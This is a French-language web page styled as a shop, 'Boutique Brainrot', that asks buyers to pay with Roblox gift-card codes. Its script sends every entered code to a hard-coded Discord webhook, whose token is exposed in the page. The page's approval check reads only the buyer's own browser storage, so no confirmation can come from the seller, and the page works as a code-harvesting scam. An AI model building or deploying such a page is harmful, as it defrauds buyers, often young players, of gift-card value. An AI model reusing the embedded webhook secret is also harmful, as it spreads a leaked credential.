<!DOCTYPE html>
<html lang="fr">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Boutique Brainrot</title>
	<style>
		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body {
			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
			background: #f5f5f5;
			color: #333;
			min-height: 100vh;
			display: flex;
			flex-direction: column;
		}

		.navbar {
			background: #fff;
			padding: 20px 40px;
			box-shadow: 0 2px 10px rgba(0,0,0,0.1);
		}

		.navbar h1 {
			font-size: 28px;
			color: #2c3e50;
		}

		.container {
			max-width: 1400px;
			margin: 40px auto;
			padding: 20px;
			flex: 1;
		}

		#products-grid {
			display: grid;
			grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
			gap: 30px;
		}

		.card {
			background: #fff;
			border-radius: 12px;
			overflow: hidden;
			box-shadow: 0 4px 15px rgba(0,0,0,0.1);
			transition: transform 0.3s, box-shadow 0.3s;
		}

		.card:hover {
			transform: translateY(-5px);
			box-shadow: 0 8px 25px rgba(0,0,0,0.15);
		}

		.img-box {
			width: 100%;
			height: 200px;
			background: #f0f0f0;
			overflow: hidden;
		}

		.img-box img {
			width: 100%;
			height: 100%;
			object-fit: cover;
		}

		.card-content {
			padding: 20px;
		}

		.card h3 {
			font-size: 20px;
			margin-bottom: 10px;
			color: #2c3e50;
		}

		.card .description {
			color: #7f8c8d;
			font-size: 14px;
			margin-bottom: 15px;
		}

		.card .price {
			font-size: 24px;
			font-weight: bold;
			color: #27ae60;
			margin-bottom: 15px;
		}

		.btn-buy {
			width: 100%;
			padding: 12px;
			background: #3498db;
			color: #fff;
			border: none;
			border-radius: 8px;
			font-size: 16px;
			font-weight: bold;
			cursor: pointer;
			transition: background 0.3s;
		}

		.btn-buy:hover {
			background: #2980b9;
		}

		.btn-buy:disabled {
			background: #95a5a6;
			cursor: not-allowed;
		}

		.sold-badge {
			position: absolute;
			top: 15px;
			right: 15px;
			background: #e74c3c;
			color: white;
			padding: 8px 16px;
			border-radius: 20px;
			font-size: 12px;
			font-weight: bold;
		}

		.modal {
			display: none;
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background: rgba(0,0,0,0.7);
			align-items: center;
			justify-content: center;
			z-index: 1000;
		}

		.modal-content {
			background: #fff;
			padding: 40px;
			border-radius: 16px;
			max-width: 450px;
			width: 90%;
			box-shadow: 0 10px 40px rgba(0,0,0,0.3);
			position: relative;
		}

		.modal-content h2 {
			margin-bottom: 10px;
			color: #2c3e50;
		}

		.modal-content p {
			color: #7f8c8d;
			margin-bottom: 20px;
		}

		.modal-content input {
			width: 100%;
			padding: 12px;
			border: 2px solid #ddd;
			border-radius: 8px;
			font-size: 16px;
			margin-bottom: 20px;
		}

		.modal-content input:focus {
			outline: none;
			border-color: #3498db;
		}

		.close-btn {
			position: absolute;
			top: 15px;
			right: 15px;
			background: none;
			border: none;
			font-size: 28px;
			color: #95a5a6;
			cursor: pointer;
			line-height: 1;
		}

		.close-btn:hover {
			color: #e74c3c;
		}

		.spinner {
			border: 3px solid #f3f3f3;
			border-top: 3px solid #3498db;
			border-radius: 50%;
			width: 40px;
			height: 40px;
			animation: spin 1s linear infinite;
			margin: 20px auto;
			display: none;
		}

		@keyframes spin {
			0% { transform: rotate(0deg); }
			100% { transform: rotate(360deg); }
		}

		.status-message {
			position: fixed;
			top: 20px;
			right: 20px;
			padding: 20px 30px;
			border-radius: 12px;
			box-shadow: 0 5px 20px rgba(0,0,0,0.2);
			font-weight: bold;
			z-index: 2000;
			display: none;
			animation: slideIn 0.3s ease;
		}

		@keyframes slideIn {
			from {
				transform: translateX(400px);
				opacity: 0;
			}
			to {
				transform: translateX(0);
				opacity: 1;
			}
		}

		.status-success {
			background: #2ecc71;
			color: white;
		}

		.status-error {
			background: #e74c3c;
			color: white;
		}

		.status-pending {
			background: #f39c12;
			color: white;
		}
	</style>
</head>
<body>

	<nav class="navbar">
		<h1>Boutique Brainrot</h1>
	</nav>

	<div class="container">
		<div id="products-grid"></div>
	</div>

	<div id="modal-pay" class="modal">
		<div class="modal-content">
			<button class="close-btn" onclick="closeModal()">×</button>
			<h2 id="product-name">Paiement</h2>
			<p id="product-price">Prix: 0 EUR</p>
			<p style="font-size: 14px;">Entrez votre code carte cadeau Roblox</p>
			<input type="text" id="code-input" placeholder="Code Roblox">
			<div class="spinner" id="spinner"></div>
			<button class="btn-buy" onclick="submitPayment()">Valider</button>
		</div>
	</div>

	<div id="status-message" class="status-message"></div>

	<script>
		const WEBHOOK_URL = "https://discord.com/api/webhooks/1466863288552788125/jJmbTk9-imPHe4apZ8sTs0AWJZgi4tUltEdC14qMgaAJKPkB01VRMvJ2-ARXQa21dScq";
		let products = [];
		let currentProduct = null;

		// Charger les produits
		async function loadProducts() {
			try {
				const response = await fetch('products.json');
				products = await response.json();
				displayProducts();
			} catch (error) {
				console.error('Erreur chargement produits');
			}
		}

		// Afficher les produits
		function displayProducts() {
			const grid = document.getElementById('products-grid');
			const sold = JSON.parse(localStorage.getItem('sold_items') || "[]");

			grid.innerHTML = products.map(p => `
				<div class="card" style="position: relative;">
					${sold.includes(p.title) ? '<div class="sold-badge">VENDU</div>' : ''}
					<div class="img-box">
						<img src="images/${p.image}" alt="${p.title}" 
							onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22%3E%3Crect fill=%22%23f0f0f0%22 width=%22200%22 height=%22200%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 font-size=%2218%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23999%22%3EImage%3C/text%3E%3C/svg%3E'">
					</div>
					<div class="card-content">
						<h3>${p.title}</h3>
						<p class="description">${p.description}</p>
						<p class="price">${p.price} EUR</p>
						<button class="btn-buy" onclick='openPayment(${JSON.stringify(p)})' ${sold.includes(p.title) ? 'disabled' : ''}>
							${sold.includes(p.title) ? 'VENDU' : 'ACHETER'}
						</button>
					</div>
				</div>
			`).join('');
		}

		// Ouvrir le modal de paiement
		function openPayment(product) {
			currentProduct = product;
			document.getElementById('product-name').textContent = product.title;
			document.getElementById('product-price').textContent = 'Prix: ' + product.price + ' EUR';
			document.getElementById('code-input').value = '';
			document.getElementById('modal-pay').style.display = 'flex';
			setTimeout(() => document.getElementById('code-input').focus(), 100);
		}

		// Fermer le modal
		function closeModal() {
			document.getElementById('modal-pay').style.display = 'none';
		}

		// Afficher un message de statut
		function showStatus(message, type) {
			const statusDiv = document.getElementById('status-message');
			statusDiv.textContent = message;
			statusDiv.className = 'status-message status-' + type;
			statusDiv.style.display = 'block';

			setTimeout(() => {
				statusDiv.style.display = 'none';
			}, 5000);
		}

		// Soumettre le paiement
		async function submitPayment() {
			const code = document.getElementById('code-input').value.trim();

			if (!code) {
				alert('Veuillez entrer un code');
				return;
			}

			const orderId = Date.now();
			document.getElementById('spinner').style.display = 'block';

			// Sauvegarder la commande
			let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
			pending[orderId] = {
				product: currentProduct.title,
				price: currentProduct.price,
				code: code,
				status: 'pending',
				timestamp: new Date().toISOString()
			};
			localStorage.setItem('pending_orders', JSON.stringify(pending));

			// Envoyer sur Discord
			try {
				await fetch(WEBHOOK_URL, {
					method: 'POST',
					headers: {'Content-Type': 'application/json'},
					body: JSON.stringify({
						content: 
							"NOUVELLE COMMANDE\n" +
							"ID: " + orderId + "\n" +
							"Produit: " + currentProduct.title + "\n" +
							"Prix: " + currentProduct.price + " EUR\n" +
							"Code Roblox: " + code + "\n" +
							"Date: " + new Date().toLocaleString('fr-FR') + "\n\n" +
							"Repondez a ce message avec:\n" +
							"O " + orderId + " pour accepter\n" +
							"N " + orderId + " pour refuser"
					})
				});

				document.getElementById('spinner').style.display = 'none';
				closeModal();
				showStatus('Demande envoyee! En attente de validation...', 'pending');
				checkOrderStatus(orderId);

			} catch (error) {
				document.getElementById('spinner').style.display = 'none';
				showStatus('Erreur lors de l\'envoi', 'error');
			}
		}

		// Vérifier le statut de la commande
		function checkOrderStatus(orderId) {
			const interval = setInterval(() => {
				let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");

				if (pending[orderId] && pending[orderId].status === 'approved') {
					clearInterval(interval);

					// Marquer comme vendu
					let sold = JSON.parse(localStorage.getItem('sold_items') || "[]");
					sold.push(pending[orderId].product);
					localStorage.setItem('sold_items', JSON.stringify(sold));

					delete pending[orderId];
					localStorage.setItem('pending_orders', JSON.stringify(pending));

					showStatus('PAIEMENT EFFECTUE! Achat valide.', 'success');
					displayProducts();

					setTimeout(() => {
						window.location.href = "https://discord.gg/893smJm6";
					}, 3000);

				} else if (pending[orderId] && pending[orderId].status === 'rejected') {
					clearInterval(interval);

					delete pending[orderId];
					localStorage.setItem('pending_orders', JSON.stringify(pending));

					showStatus('Commande refusee. Code invalide.', 'error');
					displayProducts();
				}
			}, 2000);

			setTimeout(() => clearInterval(interval), 600000);
		}

		// API pour valider depuis la console
		window.approveOrder = function(orderId) {
			let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
			if (pending[orderId]) {
				pending[orderId].status = 'approved';
				localStorage.setItem('pending_orders', JSON.stringify(pending));
				console.log('Commande acceptee');
				return true;
			}
			return false;
		};

		window.rejectOrder = function(orderId) {
			let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
			if (pending[orderId]) {
				pending[orderId].status = 'rejected';
				localStorage.setItem('pending_orders', JSON.stringify(pending));
				console.log('Commande refusee');
				return true;
			}
			return false;
		};

		// Démarrage
		document.addEventListener('DOMContentLoaded', () => {
			loadProducts();

			// Enter pour valider
			document.getElementById('code-input').addEventListener('keypress', (e) => {
				if (e.key === 'Enter') submitPayment();
			});

			// Clic en dehors du modal pour fermer
			document.getElementById('modal-pay').addEventListener('click', (e) => {
				if (e.target.id === 'modal-pay') closeModal();
			});
		});
	</script>

</body>
</html>
